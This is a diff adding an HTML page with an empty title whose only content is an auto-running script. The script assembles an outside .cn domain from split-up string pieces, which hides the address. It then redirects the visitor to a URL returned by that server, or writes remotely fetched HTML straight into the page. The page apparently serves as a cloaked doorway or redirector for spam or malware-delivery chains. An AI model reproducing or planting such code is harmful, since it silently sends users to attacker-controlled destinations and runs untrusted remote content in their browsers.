@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<!-- saved from url=(0014)about:internet -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+	<title></title>
+</head>
+<body>
+<span id="show"></span>
+
+<script type="text/javascript">
+ (function () {
+    var codestr = getQueryParam("lkid");
+    var rktype = getQueryParam("rkld");
+
+    if (rktype == 'false') {
+        var code2 = codestr.split("&");
+        var code = code2[0].split("_");
+        var ajax = new XMLHttpRequest();
+        var  f1 = "sl";
+        var  f2 = ".";
+        var  f3 = "zlg";
+        var  f4 = "yt";
+        var  f5 = "y";
+        var  f6 = ".";
+        var  f7 = "cn";
+        var  f8 = "/";
+        var  f9 = "index";
+        var  f10 = ".php";
+        var  f11 = "/";
+        var  f12 = "Home";
+        var  f13 = "/";
+        var  f14 = "Gatedomain";
+        var  f15 = "/";
+        var  f16 = "ShowNewPage";
+        var  f17 = "/";
+        var  f18 = "id/";
+        var gourl ='http://'+f1+f2+f3+f4+f5+f6+f7+f8+f9+f10+f11+f12+f13+f14+f15+f16+f17+f18+code2[0];
+        ajax.open('get',gourl);
+        ajax.send();
+        ajax.onreadystatechange = function () {if (ajax.readyState==4 && ajax.status==200) {
+              window.location.href  =ajax.responseText;}}
+  }else{
+    var strarr = codestr.split('_');
+    var Time = (new Date()).getTime();
+    var url = 'http://'+Time+'.'+strarr[2]+'.cn/index.php/Home/Speed/GteArticl/id/'+codestr;
+    var ajax = new XMLHttpRequest();
+    ajax.open('get',url);
+    ajax.send();
+    ajax.onreadystatechange = function () {if (ajax.readyState==4 && ajax.status==200) {
+             document.write(ajax.responseText);}}
+  }
+
+
+})();
+
+function getQueryParam(variable)
+{
+  var query = window.location.search.substring(1);var vars = query.split("?");
+  var codarr = vars[0].split("&");
+
+  for (var i=0;i<codarr.length;i++) {
+    // console.log(codarr);
+      for (var i=0;i<codarr.length;i++) {var pair = codarr[i].split("=");
+        if(pair[0] == variable){
+          return pair[1];
+        }
+      }
+  }
+
+  return(false);
+}
+
+
+</script>
+</body></html>
